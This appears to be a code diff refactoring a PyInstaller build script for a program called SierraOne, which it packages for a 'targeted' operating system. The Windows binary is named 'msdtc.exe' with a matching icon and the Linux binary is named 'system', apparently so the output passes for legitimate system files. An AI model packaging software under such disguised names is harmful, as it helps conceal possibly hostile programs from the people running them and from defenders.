@@ -7,33 +7,35 @@ import time
 from shutil import rmtree
 
 
-def remove_junk(dist):
-    os.remove("msdtc.exe.spec" if dist.lower() == "windows" else "system.spec")
+dist = ""
+
+def remove_junk():
     rmtree("build")
     rmtree("__pycache__")
     
-def builder(dist):
-    if dist.lower() == "windows":
+def builder():
+    if dist == "windows":
         subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
         time.sleep(1)
-        remove_junk(dist)
+        os.remove("msdtc.exe.spec")
+        remove_junk()
         #subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
         print("\nDone. Check 'dist' for your file")
-        sys.exit(0)
-
-    elif dist.lower() == "linux":
+    elif dist == "linux":
         subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
         time.sleep(1)
-        remove_junk(dist)
+        os.remove("system.spec")
+        remove_junk()
         #subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
         print("\nDone. Check 'dist' for your file")
-        sys.exit(0)
-
     else:
         print("Unsupported operating system")
-        sys.exit(0)
+        
+    sys.exit(0)
         
 def main():
+    global dist
+    
     parser = argparse.ArgumentParser()
     parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")
 
@@ -44,7 +46,8 @@ def main():
         print("Missing arguments")
         sys.exit(0)
 
-    builder(args.os)
+    dist = args.os.lower()
+    builder()
 
 if __name__ == "__main__":
     main()
